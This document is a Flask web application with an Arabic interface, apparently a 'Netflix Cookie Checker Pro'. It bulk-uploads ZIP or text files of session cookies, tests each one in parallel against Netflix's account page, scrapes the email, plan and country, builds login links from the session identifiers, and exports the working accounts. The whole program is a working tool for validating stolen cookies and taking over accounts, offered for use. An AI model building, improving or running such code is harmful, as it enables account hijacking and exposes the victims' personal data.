from flask import Flask, render_template_string, request, jsonify
import requests, re, json, base64, os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

HTML = r'''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Cookie Checker Pro | رفع ملفات ZIP وفحص منفصل</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        :root {
            --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914;
            --green:#2ecc71; --yellow:#f39c12; --blue:#3498db; --white:#fff;
            --text2:#b3b3b3; --border:#333; --radius:14px; --gap:12px;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
        .container { max-width:1100px; margin:auto; }
        .logo { text-align:center; font-size:3.5em; font-weight:900; color:var(--red); letter-spacing:6px; margin-bottom:10px; }
        h1 { text-align:center; background:linear-gradient(135deg,var(--red),#f40612); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .sub { color:var(--text2); text-align:center; margin-bottom:20px; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:var(--gap); margin:20px 0; }
        .stat { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:15px; text-align:center; }
        .stat-icon { font-size:2em; }
        .stat-val { font-size:2em; font-weight:900; }
        .stat-label { color:var(--text2); font-size:0.8em; }
        .section { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:20px 0; }
        .section-title { font-size:1.2em; margin-bottom:15px; display:flex; align-items:center; gap:8px; }
        .upload-area {
            border:2px dashed var(--border); border-radius:var(--radius); padding:30px 20px;
            text-align:center; margin-bottom:15px; background:var(--input); cursor:pointer;
            transition:all 0.3s;
        }
        .upload-area:hover, .upload-area.dragover { border-color:var(--red); background:rgba(229,9,20,0.05); }
        .file-list { margin:10px 0; }
        .file-item {
            background:var(--input); border:1px solid var(--border); border-radius:10px;
            padding:12px 15px; margin-bottom:8px; display:flex; align-items:center;
            justify-content:space-between; flex-wrap:wrap; gap:10px;
        }
        .file-name { font-weight:600; word-break:break-all; }
        .file-info { color:var(--text2); font-size:0.8em; }
        .btn {
            padding:10px 20px; border:none; border-radius:8px; font-weight:700; cursor:pointer;
            color:var(--white); font-family:'Cairo'; transition:all 0.3s; font-size:0.9em;
            display:inline-flex; align-items:center; gap:6px;
        }
        .btn-primary { background:var(--red); }
        .btn-success { background:var(--green); }
        .btn-warning { background:#e67e22; }
        .btn-outline { background:transparent; border:2px solid var(--red); color:var(--red); }
        .btn-outline:hover { background:var(--red); color:var(--white); }
        .btn:disabled { opacity:0.5; cursor:not-allowed; }
        .progress { display:none; margin:15px 0; }
        .progress-bar { height:8px; background:var(--input); border-radius:4px; overflow:hidden; }
        .progress-fill { height:100%; background:var(--red); width:0%; transition:width 0.3s; }
        .progress-text { text-align:center; color:var(--text2); margin-top:5px; }
        .results-by-file { margin-top:20px; }
        .file-result { margin-bottom:25px; border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; }
        .file-result-header { background:var(--card); padding:15px; font-weight:700; display:flex; justify-content:space-between; align-items:center; }
        .badge { padding:5px 12px; border-radius:20px; font-size:0.8em; font-weight:700; }
        .badge-valid { background:rgba(46,204,113,0.15); color:var(--green); }
        .badge-invalid { background:rgba(229,9,20,0.15); color:var(--red); }
        .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
        .result-card { background:var(--card); border:1px solid var(--border); border-radius:10px; margin:10px 15px; padding:15px; }
        .result-header { display:flex; justify-content:space-between; align-items:center; cursor:pointer; }
        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin:10px 0; }
        .detail-item { background:var(--input); padding:10px; border-radius:6px; text-align:center; }
        .detail-label { color:var(--text2); font-size:0.75em; }
        .detail-value { font-weight:700; }
        .token-section { background:var(--input); border-radius:8px; padding:12px; margin-top:10px; }
        .token-display { background:#000; color:var(--green); padding:8px; border-radius:6px; font-family:monospace; word-break:break-all; margin:8px 0; }
        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:8px; margin-top:10px; }
        .link-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
        .link-icon { font-size:1.8em; }
        .copy-btn, .open-btn { padding:5px 12px; border:none; border-radius:6px; cursor:pointer; font-weight:600; margin:3px; font-family:'Cairo'; }
        .copy-btn { background:var(--green); color:var(--white); }
        .open-btn { background:var(--red); color:var(--white); }
        .filter-bar { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:15px; }
        .filter-btn { padding:6px 15px; border:1px solid var(--border); border-radius:20px; background:transparent; color:var(--text2); cursor:pointer; font-size:0.8em; }
        .filter-btn.active, .filter-btn:hover { background:var(--red); color:var(--white); border-color:var(--red); }
        .toast { position:fixed; top:20px; left:50%; transform:translateX(-50%); padding:12px 30px; border-radius:8px; color:var(--white); font-weight:700; z-index:9999; }
        .toast-success { background:var(--green); }
        .toast-error { background:var(--red); }
        .toast-info { background:var(--blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h1>🔍 فاحص الكوكيز المتكامل</h1>
        <div class="sub">رفع ملفات ZIP/RAR (كملفات مضغوطة) وفحص كل ملف على حدة</div>

        <div class="stats">
            <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
            <div class="stat"><div class="stat-icon">✅</div><div class="stat-val" id="statValid" style="color:var(--green)">0</div><div class="stat-label">صالحة</div></div>
            <div class="stat"><div class="stat-icon">❌</div><div class="stat-val" id="statInvalid" style="color:var(--red)">0</div><div class="stat-label">غير صالحة</div></div>
            <div class="stat"><div class="stat-icon">⚠️</div><div class="stat-val" id="statErrors" style="color:var(--yellow)">0</div><div class="stat-label">أخطاء</div></div>
            <div class="stat"><div class="stat-icon">⚡</div><div class="stat-val" id="statSpeed">0s</div><div class="stat-label">الوقت</div></div>
        </div>

        <div class="section">
            <div class="section-title"><span>📁</span> رفع الملفات (ZIP أو نصوص)</div>
            <div class="upload-area" id="uploadArea">
                <div style="font-size:2.5em">📤</div>
                <div>اسحب وأفلت ملفات ZIP أو TXT/CSV هنا</div>
                <div style="color:var(--text2); font-size:0.8em;">يتم استخراج الكوكيز من كل ملف داخل ZIP وعرضها بشكل منفصل</div>
            </div>
            <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">

            <div class="file-list" id="fileList"></div>

            <div class="btn-group" style="margin-top:10px;">
                <button class="btn btn-primary" onclick="checkAllFiles()">🚀 فحص جميع الملفات</button>
                <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValidAccounts()">💾 تحميل الحسابات الشغالة</button>
                <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح الكل</button>
            </div>

            <div class="progress" id="progressContainer">
                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
                <div class="progress-text" id="progressText"></div>
            </div>
        </div>

        <div class="filter-bar">
            <button class="filter-btn active" onclick="setFilter('all')">الكل</button>
            <button class="filter-btn" onclick="setFilter('valid')">✅ صالحة</button>
            <button class="filter-btn" onclick="setFilter('invalid')">❌ غير صالحة</button>
            <button class="filter-btn" onclick="setFilter('error')">⚠️ أخطاء</button>
        </div>
        <div id="resultsContainer"></div>
    </div>

    <script>
        // --- State ---
        let fileGroups = [];              // {name, cookies:[]}
        let globalResults = [];          // all results from all files
        let currentFilter = 'all';
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const fileListDiv = document.getElementById('fileList');

        // --- Upload handling ---
        uploadArea.addEventListener('click', ()=> fileInput.click());
        uploadArea.addEventListener('dragover', e=> { e.preventDefault(); uploadArea.classList.add('dragover'); });
        uploadArea.addEventListener('dragleave', ()=> uploadArea.classList.remove('dragover'));
        uploadArea.addEventListener('drop', e=> {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            handleFiles(e.dataTransfer.files);
        });
        fileInput.addEventListener('change', e=> handleFiles(e.target.files));

        async function handleFiles(files) {
            for (let file of files) {
                if (file.name.endsWith('.zip')) {
                    try {
                        const zip = await JSZip.loadAsync(file);
                        for (let [filename, zipEntry] of Object.entries(zip.files)) {
                            if (!zipEntry.dir && (filename.endsWith('.txt') || filename.endsWith('.csv'))) {
                                const content = await zipEntry.async('string');
                                const cookies = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
                                if (cookies.length > 0) {
                                    fileGroups.push({ name: filename, cookies: cookies });
                                }
                            }
                        }
                        showToast(`✅ تم استخراج الملفات من ${file.name}`, 'success');
                    } catch (err) {
                        showToast(`❌ خطأ في قراءة ZIP: ${err.message}`, 'error');
                    }
                } else if (file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
                    const content = await file.text();
                    const cookies = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
                    if (cookies.length > 0) {
                        fileGroups.push({ name: file.name, cookies: cookies });
                    }
                } else {
                    showToast(`⚠️ نوع ملف غير مدعوم: ${file.name}`, 'error');
                }
            }
            renderFileList();
        }

        function renderFileList() {
            fileListDiv.innerHTML = fileGroups.map((group, idx) => `
                <div class="file-item">
                    <div>
                        <div class="file-name">📄 ${group.name}</div>
                        <div class="file-info">${group.cookies.length} كوكيز</div>
                    </div>
                    <div>
                        <button class="btn btn-outline" onclick="checkSingleFile(${idx})" style="padding:6px 12px; font-size:0.8em;">فحص هذا الملف</button>
                        <button class="btn btn-outline" onclick="removeFile(${idx})" style="padding:6px 12px; font-size:0.8em; border-color:#666; color:#666;">حذف</button>
                    </div>
                </div>
            `).join('');
        }

        function removeFile(idx) {
            fileGroups.splice(idx, 1);
            renderFileList();
        }

        // --- Check logic ---
        async function checkSingleFile(idx) {
            const group = fileGroups[idx];
            if (!group || group.cookies.length === 0) return;
            await processGroup(group);
        }

        async function checkAllFiles() {
            if (fileGroups.length === 0) {
                showToast('❌ لا توجد ملفات مرفوعة', 'error');
                return;
            }
            globalResults = [];
            document.getElementById('resultsContainer').innerHTML = '';
            document.getElementById('progressContainer').style.display = 'block';
            const totalCookies = fileGroups.reduce((sum, g) => sum + g.cookies.length, 0);
            let processedCookies = 0;
            const startTime = Date.now();

            for (let group of fileGroups) {
                const res = await checkCookiesBatch(group.cookies);
                res.forEach(r => { r.fileName = group.name; });
                globalResults.push(...res);
                processedCookies += group.cookies.length;
                const pct = Math.round(processedCookies / totalCookies * 100);
                document.getElementById('progressFill').style.width = pct + '%';
                document.getElementById('progressText').textContent = `فحص ${processedCookies}/${totalCookies} كوكيز...`;
                // update partial results
                renderResultsByFile();
            }
            document.getElementById('statSpeed').textContent = ((Date.now() - startTime)/1000).toFixed(2) + 's';
            document.getElementById('progressContainer').style.display = 'none';
            updateStats();
            document.getElementById('btnDownloadValid').disabled = (globalResults.filter(r=>r.status==='valid').length === 0);
            showToast(`✅ تم فحص ${totalCookies} كوكيز`, 'success');
        }

        async function processGroup(group) {
            // for single file check we also want to update global results
            globalResults = globalResults.filter(r => r.fileName !== group.name);
            const res = await checkCookiesBatch(group.cookies);
            res.forEach(r => { r.fileName = group.name; });
            globalResults.push(...res);
            renderResultsByFile();
            updateStats();
            document.getElementById('btnDownloadValid').disabled = (globalResults.filter(r=>r.status==='valid').length === 0);
        }

        async function checkCookiesBatch(cookies) {
            const results = [];
            const batchSize = 30;
            for (let i = 0; i < cookies.length; i += batchSize) {
                const batch = cookies.slice(i, i + batchSize).join('\n');
                try {
                    const resp = await fetch('/check_multiple', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cookies: batch})
                    });
                    const data = await resp.json();
                    if (data.results) results.push(...data.results);
                } catch(e) {
                    // add error entries for each cookie in batch
                    for (let j = i; j < Math.min(i+batchSize, cookies.length); j++) {
                        results.push({status:'error', message:'فشل الاتصال', cookie: cookies[j], timestamp: new Date().toLocaleString()});
                    }
                }
            }
            // reindex
            results.forEach((r, i) => r.index = i+1);
            return results;
        }

        // --- Rendering results grouped by file ---
        function renderResultsByFile() {
            const container = document.getElementById('resultsContainer');
            if (!globalResults.length) {
                container.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px;">لا نتائج بعد</div>';
                return;
            }
            const grouped = {};
            globalResults.forEach(r => {
                const key = r.fileName || 'غير معروف';
                if (!grouped[key]) grouped[key] = [];
                grouped[key].push(r);
            });

            container.innerHTML = Object.entries(grouped).map(([fileName, results]) => {
                const filtered = currentFilter==='all' ? results : results.filter(r=> r.status===currentFilter);
                return `
                <div class="file-result">
                    <div class="file-result-header">
                        <span>📄 ${fileName} (${results.length} كوكيز)</span>
                        <span class="badge badge-valid">${results.filter(r=>r.status==='valid').length} صالحة</span>
                    </div>
                    <div style="padding:10px;">
                        ${filtered.map(r => renderCookieResult(r)).join('')}
                        ${filtered.length === 0 ? '<div style="color:var(--text2);padding:10px;">لا نتائج تطابق الفلتر</div>' : ''}
                    </div>
                </div>`;
            }).join('');
        }

        function renderCookieResult(r) {
            const cls = 'badge-' + (r.status || 'unknown');
            const statusText = {valid:'✅ صالحة', invalid:'❌ غير صالحة', error:'⚠️ خطأ'}[r.status] || '❓';
            let details = '';
            if (r.details) {
                details = '<div class="detail-grid">';
                for (let [k,v] of Object.entries({membership:'📋 العضوية', plan:'💎 الباقة', country:'🌍 البلد', email:'📧 البريد'}))
                    if (r.details[k] && r.details[k]!=='غير معروف') details += `<div class="detail-item"><div class="detail-label">${v}</div><div class="detail-value">${r.details[k]}</div></div>`;
                details += '</div>';
            }
            let tokenHtml = '';
            if (r.api_tokens?.api_token) {
                tokenHtml = `<div class="token-section"><strong>🔑 ApiToken</strong><div class="token-display">${r.api_tokens.api_token}</div><button class="copy-btn" onclick="copyText('${r.api_tokens.api_token.replace(/'/g,"\\'")}')">📋 نسخ</button><div class="links-grid">`;
                if (r.api_tokens.direct_links) {
                    for (let [k,d] of Object.entries(r.api_tokens.direct_links)) {
                        tokenHtml += `<div class="link-card"><div class="link-icon">${d.name.split(' ')[0]}</div><div class="link-name">${d.name}</div><div><button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button> <button class="copy-btn" onclick="copyText('${d.url.replace(/'/g,"\\'")}')">📋 نسخ</button></div></div>`;
                    }
                }
                tokenHtml += '</div></div>';
            }
            return `
            <div class="result-card">
                <div class="result-header" onclick="this.parentElement.querySelector('.res-body').classList.toggle('hidden')">
                    <div style="display:flex; align-items:center; gap:10px;">
                        <span class="badge ${cls}">${statusText}</span>
                        <span>#${r.index}</span>
                        <span>${r.message||''}</span>
                    </div>
                    <span>▼</span>
                </div>
                <div class="res-body" style="display:none; margin-top:10px;">
                    ${details}
                    ${tokenHtml}
                    <div style="color:var(--text2); font-size:0.8em;">${r.timestamp||''}</div>
                </div>
            </div>`;
        }

        function setFilter(f) {
            currentFilter = f;
            document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            renderResultsByFile();
        }

        function updateStats() {
            document.getElementById('statTotal').textContent = globalResults.length;
            document.getElementById('statValid').textContent = globalResults.filter(r=>r.status==='valid').length;
            document.getElementById('statInvalid').textContent = globalResults.filter(r=>r.status==='invalid').length;
            document.getElementById('statErrors').textContent = globalResults.filter(r=>r.status==='error').length;
        }

        function downloadValidAccounts() {
            const valid = globalResults.filter(r=> r.status==='valid');
            if (!valid.length) return showToast('لا حسابات صالحة', 'error');
            let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
            valid.forEach((r,i) => {
                txt += `[${i+1}] الملف: ${r.fileName||'?'}\n`;
                txt += `الكوكيز: ${r.cookie||'(غير متوفر)'}\n`;
                if (r.details) {
                    txt += `البريد: ${r.details.email||'?'}\n`;
                    txt += `العضوية: ${r.details.membership||'?'}\n`;
                    txt += `الباقة: ${r.details.plan||'?'}\n`;
                    txt += `البلد: ${r.details.country||'?'}\n`;
                }
                if (r.api_tokens?.api_token) {
                    txt += `ApiToken: ${r.api_tokens.api_token}\n`;
                }
                if (r.api_tokens?.direct_links) {
                    txt += `رابط الكمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\n`;
                    txt += `رابط الجوال: ${r.api_tokens.direct_links.mobile?.url||''}\n`;
                    txt += `رابط التلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
                }
                txt += '─'.repeat(50) + '\n';
            });
            const blob = new Blob(['\uFEFF'+txt], {type:'text/plain;charset=utf-8'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'netflix_valid_accounts.txt';
            a.click();
            showToast('💾 تم تحميل الحسابات الصالحة', 'success');
        }

        function copyText(text) { navigator.clipboard.writeText(text).then(()=> showToast('✅ تم النسخ','success')).catch(()=> showToast('❌ فشل','error')); }
        function showToast(msg, type) {
            const t = document.createElement('div');
            t.className = `toast toast-${type}`;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(()=> t.remove(), 2500);
        }
        function clearAll() {
            fileGroups = [];
            globalResults = [];
            fileListDiv.innerHTML = '';
            document.getElementById('resultsContainer').innerHTML = '';
            document.getElementById('btnDownloadValid').disabled = true;
            updateStats();
            document.getElementById('statSpeed').textContent = '0s';
            showToast('🗑️ تم مسح الكل', 'info');
        }
    </script>
</body>
</html>
'''

# --- Backend (unchanged) ---
def check_cookie(cookie):
    try:
        headers = {'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get('https://www.netflix.com/YourAccount', headers=headers, timeout=10, allow_redirects=False)
        result = {
            'status':'unknown','message':'','details':{},'api_tokens':{},
            'cookie': cookie,
            'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        if r.status_code == 200:
            if 'membershipStatus' in r.text:
                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', r.text)
                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
                em = re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة والحساب نشط'
                result['details'] = {
                    'membership': mm.group(1) if mm else 'غير معروف',
                    'plan': pm.group(1) if pm else 'غير معروف',
                    'country': cm.group(1) if cm else 'غير معروف',
                    'email': em.group(1) if em else 'غير معروف'
                }
                nid = sid = None
                for p in cookie.split(';'):
                    p = p.strip()
                    if p.startswith('NetflixId='): nid = p.split('=',1)[1]
                    elif p.startswith('SecureNetflixId='): sid = p.split('=',1)[1]
                if nid and sid:
                    payload = {'netflixId':nid,'secureNetflixId':sid,'timestamp':datetime.now().isoformat()}
                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
                    result['api_tokens'] = {
                        'api_token': token,
                        'direct_links': {
                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
                        }
                    }
            else:
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة (تم تسجيل الدخول)'
        elif r.status_code == 302:
            result['status'] = 'invalid'
            result['message'] = '❌ منتهية الصلاحية'
        else:
            result['status'] = 'error'
            result['message'] = f'⚠️ خطأ {r.status_code}'
        return result
    except Exception as e:
        return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/check_multiple', methods=['POST'])
def check_multiple():
    data = request.get_json()
    cookies = data.get('cookies','')
    if not cookies: return jsonify({'status':'error'})
    lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
        for f in as_completed(futs):
            try:
                res = f.result()
                res['index'] = futs[f]
                results.append(res)
            except: pass
    results.sort(key=lambda x: x.get('index',0))
    return jsonify({'results':results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)))
